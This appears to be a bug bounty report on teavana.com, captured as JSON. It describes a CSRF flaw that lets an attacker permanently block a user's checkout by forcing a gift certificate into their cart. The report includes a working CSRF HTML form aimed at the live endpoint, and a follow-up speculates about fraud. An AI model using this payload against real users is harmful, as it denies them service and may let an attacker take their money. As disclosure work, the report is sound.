  "vulnerability_information": "SUMMARY\n--------------\nHello, I have found an extremely interesting issue that can be used to permanently lock a user's possibility of ever buying anything from teavana.com by removing the credit card payment method.\n\nPOC\n---------\nCSRF snippet\n```\n<html>\n\t<head></head>\n\t<body>\n\t\t<form method=\"POST\" id=\"GiftCertificateForm\" action=\"http://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/GiftCert-AddToBasket\">\n\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_from\" type=\"text\" name=\"dwfrm_giftcert_purchase_from\" value=\"Test whatever\" maxlength=\"2147483647\">\n\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_recipient\" type=\"text\" name=\"dwfrm_giftcert_purchase_recipient\" value=\"Test whhhateever\" maxlength=\"2147483647\">\n\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_recipientEmail\" type=\"text\" name=\"dwfrm_giftcert_purchase_recipientEmail\" value=\"valid@iamvalid.com\" maxlength=\"2147483647\">\n\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_confirmRecipientEmail\" type=\"text\" name=\"dwfrm_giftcert_purchase_confirmRecipientEmail\" value=\"valid@iamvalid.com\" maxlength=\"2147483647\">\n\t\t\t<textarea class=\"textbox\" id=\"dwfrm_giftcert_purchase_message\" name=\"dwfrm_giftcert_purchase_message\" rows=\"5\" cols=\"50\">Bla bla</textarea>\n\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_amount\" type=\"text\" name=\"dwfrm_giftcert_purchase_amount\" value=\"100\" maxlength=\"2147483647\">\n\t\t\t<input type=\"submit\" value=\"Send\" />\n\t\t</form>\n\t</body>\n</html>\n```\n\nDESCRIPTION\n----------------\nSo, I just wanted to find demandware.store hidden links and in my search I stumbled across\n```\nhttp://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/GiftCert-Purchase\n```\nFrom here, one can add custom gift cards in cart with a value between 5 and 5000 euros (or something like that). I have noticed that this is not CSRF protected, but this was a minor issue. Well, it became a serious problem after I noticed that after adding that gift card in my card, I wasn't able to fully empty my cart anymore and the credit card option was simply not available anymore and I wasn't able to fulfill any orders. Logging out and in doesn't do anything. Deleting cart product doesn't do anything. And because I tested teavana for some time, I know for a fact that the items in cart stay in cart (even after weeks).\n\nSo, I have made a new account, added the CSRF POC in a script then tested the flow and it worked. I have made my account unable to buy anything by adding that gift card in cart.\n\nIMPACT\n----------------\nPermanently denying a user the possibility to fulfill with his account any orders is a very big issue (hence the High severity I personally find) and if someone launched an attack against you, you will lose customers and money (not to mention the potentially negative publicity)\n\nVideo POC attached.\n\n",

      "message": "Hi @coldbr3w \n\nUnfortunatelly I can only speculate here, as I don't have a teavana/starbucks card. But, I will add my remarks here. \n\nA very important detail here is that the total sum shown in the mini-cart (the top right one) contains the added value from the Gift certificate that is given in the CSRF in the `dwfrm_giftcert_purchase_amount` input. But, the total value in the checkout page does not contain this value. \n\nAnother important detail is that if you delete all the cart products while having the gift certificate in, you will have in the end a total of 0 euros show in the checkout page, but you are theoretically able to buy that using your teavana/starbucks card (this does not happend while having only normal products, you are automatically redirected to startpage and you cannot finish your process, you cannot choose any address, etc.). This makes me believe that the system identifies the cart value show in the minicart, not the one shown in the checkout page.\n\nThose 2 remarks make me believe that the customer will pay the value included with the gift certificates, not the one from the checkout page, making this an even bigger problem. And the attacker could actually receive per email the gift certificate (his email address in added in the `dwfrm_giftcert_purchase_recipientEmail` + `dwfrm_giftcert_purchase_confirmRecipientEmail` inputs). If this happens, there could be real legal issues here, as the customer does not see in the checkout page the real final sum.\n\nBut, as I said, I cannot test this functionality as I do not have a teavana/starbucks card. I hope this is enough...\n\nI would also like this opportunity to ask you if you could provide me with a number to test this, and to also test other cards related functionality.",
